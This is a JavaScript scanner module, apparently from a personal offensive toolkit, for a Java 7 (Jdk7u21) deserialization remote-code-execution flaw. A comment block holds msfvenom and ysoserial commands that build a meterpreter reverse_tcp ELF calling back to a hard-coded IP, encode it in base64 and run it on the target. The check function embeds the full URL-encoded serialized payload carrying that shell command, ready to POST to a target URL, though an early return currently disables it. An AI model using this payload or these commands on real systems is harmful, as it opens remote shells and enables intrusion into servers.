module.exports={
	tags:"jre7,jdk7,jre1.7,jdk1.7,1.7,web,CVE-2013-0431,0431",
	des:"jre7,jdk7,jre1.7,jdk1.7,1.7,webVulnerability detection,",
	VulApps:["https://github.com/frohoff/ysoserial/issues/6"],
	urls:[
		"https://gist.github.com/frohoff/24af7913611f8406eaf3",
		'http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html'
,'http://www.deependresearch.org/2012/08/java-7-vulnerability-analysis.html'
,'http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/'
,'http://www.deependresearch.org/2012/08/java-7-0-day-vulnerability-information.html'
,'http://www.oracle.com/technetwork/topics/security/alert-cve-2012-4681-1835715.html'
,'https://community.rapid7.com/community/metasploit/blog/2012/08/27/lets-start-the-week-with-a-new-java-0day'
,'https://bugzilla.redhat.com/show_bug.cgi?id=852051'],
	test:"node checkUrl.js -v -u 'http://20.165.51.18:8082/sjcj/login.jsp' --tags jre7",
/*
/Users/`whoami`/safe/top20/metasploit-framework/msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=97.64.81.120 LPORT=12345 -f elf -o /Users/`whoami`/safe/myhktools/tmp/120_12345.elf
base64 /Users/`whoami`/safe/myhktools/tmp/120_12345.elf
java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 'rm -rf ok.elf;echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toYUBReGgCADA5ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A"|base64 -d>ok.elf;chmod 555 ok.elf;./ok.elf &' > tmp/payload.bin

java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 'echo cm0gLXJmIG9rLmVsZjtlY2hvICJmMFZNUmdFQkFRQUFBQUFBQUFBQUFBSUFBd0FCQUFBQVZJQUVDRFFBQUFBQUFBQUFBQUFBQURRQUlBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFJQUVDQUNBQkFqUEFBQUFTZ0VBQUFjQUFBQUFFQUFBYWdwZU1kdjM0MU5EVTJvQ3NHYUo0YzJBbDF0b1lVQlJlR2dDQURBNWllRnFabGhRVVZlSjRVUE5nSVhBZVJsT2REMW9vZ0FBQUZocUFHb0ZpZU14eWMyQWhjQjV2ZXNuc2dlNUFCQUFBSW5qd2VzTXdlTU1zSDNOZ0lYQWVCQmJpZUdadGd5d0E4MkFoY0I0QXYvaHVBRUFBQUM3QVFBQUFNMkEifGJhc2U2NCAtZD5vay5lbGY7Y2htb2QgNTU1IG9rLmVsZjsuL29rLmVsZiAmCg== |base64 -d|sh'> tmp/payload.bin

./modules/exploits/windows/browser/java_codebase_trust.rb
./modules/exploits/multi/browser/java_jre17_exec.rb
exploit/multi/browser/java_jre17_exec  2012-08-26       excellent  Java 7 Applet Remote Code Execution
*/
	doCheck:function(url,fnCbk,parms)
	{
		// 没有设计完，先跳过
		if(true)return fnCbk({});
		var _t = this,_s = _t.self,hst = _s.parseUrl(url);
		// encodeURIComponent(_s.fs.readFileSync('/Users/xiatian/safe/myhktools/tmp/payload.bin').toString("utf8"))
		var ssK = ["%EF%BF%BD%EF%BF%BD%00%05sr%00%17java.util.LinkedHashSet%EF%BF%BDl%EF%BF%BDZ%EF%BF%BD%EF%BF%BD*%1E%02%00%00xr%00%11java.util.HashSet%EF%BF%BDD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD4%03%00%00xpw%0C%00%00%00%10%3F%40%00%00%00%00%00%02sr%00%3Acom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl%09WO%EF%BF%BDn%EF%BF%BD%EF%BF%BD3%03%00%09I%00%0D_indentNumberI%00%0E_transletIndexZ%00%15_useServicesMechanismL%00%19_accessExternalStylesheett%00%12Ljava%2Flang%2FString%3BL%00%0B_auxClassest%00%3BLcom%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2Fruntime%2FHashtable%3B%5B%00%0A_bytecodest%00%03%5B%5BB%5B%00%06_classt%00%12%5BLjava%2Flang%2FClass%3BL%00%05_nameq%00~%00%04L%00%11_outputPropertiest%00%16Ljava%2Futil%2FProperties%3Bxp%00%00%00%00%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%00t%00%03allpur%00%03%5B%5BBK%EF%BF%BD%19%15gg%EF%BF%BD7%02%00%00xp%00%00%00%02ur%00%02%5BB%EF%BF%BD%EF%BF%BD%17%EF%BF%BD%06%08T%EF%BF%BD%02%00%00xp%00%00%08u%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%00%00%002%009%0A%00%03%00%22%07%007%07%00%25%07%00%26%01%00%10serialVersionUID%01%00%01J%01%00%0DConstantValue%05%EF%BF%BD%20%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%3E%01%00%06%3Cinit%3E%01%00%03()V%01%00%04Code%01%00%0FLineNumberTable%01%00%12LocalVariableTable%01%00%04this%01%00%13StubTransletPayload%01%00%0CInnerClasses%01%005Lysoserial%2Fpayloads%2Futil%2FGadgets%24StubTransletPayload%3B%01%00%09transform%01%00r(Lcom%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2FDOM%3B%5BLcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fserializer%2FSerializationHandler%3B)V%01%00%08document%01%00-Lcom%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2FDOM%3B%01%00%08handlers%01%00B%5BLcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fserializer%2FSerializationHandler%3B%01%00%0AExceptions%07%00'%01%00%EF%BF%BD(Lcom%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2FDOM%3BLcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fdtm%2FDTMAxisIterator%3BLcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fserializer%2FSerializationHandler%3B)V%01%00%08iterator%01%005Lcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fdtm%2FDTMAxisIterator%3B%01%00%07handler%01%00ALcom%2Fsun%2Forg%2Fapache%2Fxml%2Finternal%2Fserializer%2FSerializationHandler%3B%01%00%0ASourceFile%01%00%0CGadgets.java%0C%00%0A%00%0B%07%00(%01%003ysoserial%2Fpayloads%2Futil%2FGadgets%24StubTransletPayload%01%00%40com%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2Fruntime%2FAbstractTranslet%01%00%14java%2Fio%2FSerializable%01%009com%2Fsun%2Forg%2Fapache%2Fxalan%2Finternal%2Fxsltc%2FTransletException%01%00%1Fysoserial%2Fpayloads%2Futil%2FGadgets%01%00%08%3Cclinit%3E%01%00%11java%2Flang%2FRuntime%07%00*%01%00%0AgetRuntime%01%00%15()Ljava%2Flang%2FRuntime%3B%0C%00%2C%00-%0A%00%2B%00.%01%01%EF%BF%BDecho%20cm0gLXJmIG9rLmVsZjtlY2hvICJmMFZNUmdFQkFRQUFBQUFBQUFBQUFBSUFBd0FCQUFBQVZJQUVDRFFBQUFBQUFBQUFBQUFBQURRQUlBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFJQUVDQUNBQkFqUEFBQUFTZ0VBQUFjQUFBQUFFQUFBYWdwZU1kdjM0MU5EVTJvQ3NHYUo0YzJBbDF0b1lVQlJlR2dDQURBNWllRnFabGhRVVZlSjRVUE5nSVhBZVJsT2REMW9vZ0FBQUZocUFHb0ZpZU14eWMyQWhjQjV2ZXNuc2dlNUFCQUFBSW5qd2VzTXdlTU1zSDNOZ0lYQWVCQmJpZUdadGd5d0E4MkFoY0I0QXYvaHVBRUFBQUM3QVFBQUFNMkEifGJhc2U2NCAtZD5vay5lbGY7Y2htb2QgNTU1IG9rLmVsZjsuL29rLmVsZiAmCg%3D%3D%20%7Cbase64%20-d%7Csh%08%000%01%00%04exec%01%00'(Ljava%2Flang%2FString%3B)Ljava%2Flang%2FProcess%3B%0C%002%003%0A%00%2B%004%01%00%0DStackMapTable%01%00%1Eysoserial%2FPwner339322595328519%01%00%20Lysoserial%2FPwner339322595328519%3B%00!%00%02%00%03%00%01%00%04%00%01%00%1A%00%05%00%06%00%01%00%07%00%00%00%02%00%08%00%04%00%01%00%0A%00%0B%00%01%00%0C%00%00%00%2F%00%01%00%01%00%00%00%05*%EF%BF%BD%00%01%EF%BF%BD%00%00%00%02%00%0D%00%00%00%06%00%01%00%00%00.%00%0E%00%00%00%0C%00%01%00%00%00%05%00%0F%008%00%00%00%01%00%13%00%14%00%02%00%0C%00%00%00%3F%00%00%00%03%00%00%00%01%EF%BF%BD%00%00%00%02%00%0D%00%00%00%06%00%01%00%00%003%00%0E%00%00%00%20%00%03%00%00%00%01%00%0F%008%00%00%00%00%00%01%00%15%00%16%00%01%00%00%00%01%00%17%00%18%00%02%00%19%00%00%00%04%00%01%00%1A%00%01%00%13%00%1B%00%02%00%0C%00%00%00I%00%00%00%04%00%00%00%01%EF%BF%BD%00%00%00%02%00%0D%00%00%00%06%00%01%00%00%007%00%0E%00%00%00*%00%04%00%00%00%01%00%0F%008%00%00%00%00%00%01%00%15%00%16%00%01%00%00%00%01%00%1C%00%1D%00%02%00%00%00%01%00%1E%00%1F%00%03%00%19%00%00%00%04%00%01%00%1A%00%08%00)%00%0B%00%01%00%0C%00%00%00%24%00%03%00%02%00%00%00%0F%EF%BF%BD%00%03%01L%EF%BF%BD%00%2F%121%EF%BF%BD%005W%EF%BF%BD%00%00%00%01%006%00%00%00%03%00%01%03%00%02%00%20%00%00%00%02%00!%00%11%00%00%00%0A%00%01%00%02%00%23%00%10%00%09uq%00~%00%0D%00%00%01%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%00%00%002%00%1B%0A%00%03%00%15%07%00%17%07%00%18%07%00%19%01%00%10serialVersionUID%01%00%01J%01%00%0DConstantValue%05q%EF%BF%BDi%EF%BF%BD%3CmG%18%01%00%06%3Cinit%3E%01%00%03()V%01%00%04Code%01%00%0FLineNumberTable%01%00%12LocalVariableTable%01%00%04this%01%00%03Foo%01%00%0CInnerClasses%01%00%25Lysoserial%2Fpayloads%2Futil%2FGadgets%24Foo%3B%01%00%0ASourceFile%01%00%0CGadgets.java%0C%00%0A%00%0B%07%00%1A%01%00%23ysoserial%2Fpayloads%2Futil%2FGadgets%24Foo%01%00%10java%2Flang%2FObject%01%00%14java%2Fio%2FSerializable%01%00%1Fysoserial%2Fpayloads%2Futil%2FGadgets%00!%00%02%00%03%00%01%00%04%00%01%00%1A%00%05%00%06%00%01%00%07%00%00%00%02%00%08%00%01%00%01%00%0A%00%0B%00%01%00%0C%00%00%00%2F%00%01%00%01%00%00%00%05*%EF%BF%BD%00%01%EF%BF%BD%00%00%00%02%00%0D%00%00%00%06%00%01%00%00%00%3B%00%0E%00%00%00%0C%00%01%00%00%00%05%00%0F%00%12%00%00%00%02%00%13%00%00%00%02%00%14%00%11%00%00%00%0A%00%01%00%02%00%16%00%10%00%09pt%00%04Pwnrpw%01%00xs%7D%00%00%00%01%00%1Djavax.xml.transform.Templatesxr%00%17java.lang.reflect.Proxy%EF%BF%BD'%EF%BF%BD%20%EF%BF%BD%10C%EF%BF%BD%02%00%01L%00%01ht%00%25Ljava%2Flang%2Freflect%2FInvocationHandler%3Bxpsr%002sun.reflect.annotation.AnnotationInvocationHandlerU%EF%BF%BD%EF%BF%BD%0F%15%EF%BF%BD~%EF%BF%BD%02%00%02L%00%0CmemberValuest%00%0FLjava%2Futil%2FMap%3BL%00%04typet%00%11Ljava%2Flang%2FClass%3Bxpsr%00%11java.util.HashMap%05%07%EF%BF%BD%EF%BF%BD%EF%BF%BD%16%60%EF%BF%BD%03%00%02F%00%0AloadFactorI%00%09thresholdxp%3F%40%00%00%00%00%00%0Cw%08%00%00%00%10%00%00%00%01t%00%08f5a5a608q%00~%00%09xvr%00%1Djavax.xml.transform.Templates%00%00%00%00%00%00%00%00%00%00%00xpx"];
		var szPayload = "f5a5a608=" + ssK[0];
		parms || (parms = {});
		var oOpt = _s.fnOptHeader({method: 'POST',uri: url,
				body:szPayload,
				headers:
				{
					"Host":hst.host,
	  		    	"User-Agent": _s.g_szUa,
	  		    	"content-type":"application/x-www-form-urlencoded"
	  		    }});
		_s.request(oOpt,
	    	function(e,response,b)
	    {
	    	_s.error(e);
	    	_s.fnShowBody(b);
	    	
	    	if(response)_s.log([response.request.uri.href, response.statusCode]);
	    	
    		r = {
    			"url":url,
    			des:"发现 jre7 RCE 反序列化 高危漏洞 ",
    			"send":szPayload,
    			vul:true,
    			tags:_t.tags,
    			href:response.request.uri.href};
    		fnCbk(r,_t);
    	
	    	/*
	    	_s.fnDoBody(b,"s2-055",url,null,function(o)
	    	{
  				fnCbk(_s.copyO2O(r,o),_t);
	    	});///*/
	    });
	    
	}
};